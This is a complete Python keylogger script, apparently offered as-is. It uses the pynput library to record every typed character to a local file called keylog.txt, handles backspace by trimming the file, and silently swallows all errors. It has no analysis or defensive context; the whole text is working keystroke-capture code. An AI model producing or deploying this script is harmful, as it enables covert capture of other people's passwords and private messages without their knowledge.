from pynput import keyboard
from datetime import datetime

# This is where the keystrokes will be saved
log_file = "keylog.txt"

# Function to write key to file
def write_to_file(key):
    try:
        key_str = ''
        if key == keyboard.Key.space:
            key_str = ' '
        elif key == keyboard.Key.enter:
            key_str = '\n'
        elif key == keyboard.Key.backspace:
            with open(log_file, "rb+") as f:
                f.seek(0, 2)  # Move to the end of the file
                size = f.tell()
                if size:
                    f.truncate(size - 1)  # Remove the last character
            return
        elif hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            # Skip modifiers like ctrl, shift, etc.
            return

        with open(log_file, "a") as f:
            f.write(key_str)

    except Exception as e:
        pass  # Skip errors silently

# This function runs when a key is pressed
def on_press(key):
    try:
        write_to_file(key)
    except:
        pass  # Skip errors

# Add timestamp before starting the keylogger
with open(log_file, "a") as f:
    f.write(f"\n\n--- Logging started at {datetime.now()} ---\n")

# Start listening to the keyboard with graceful shutdown on Ctrl+C
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nKeylogger stopped.")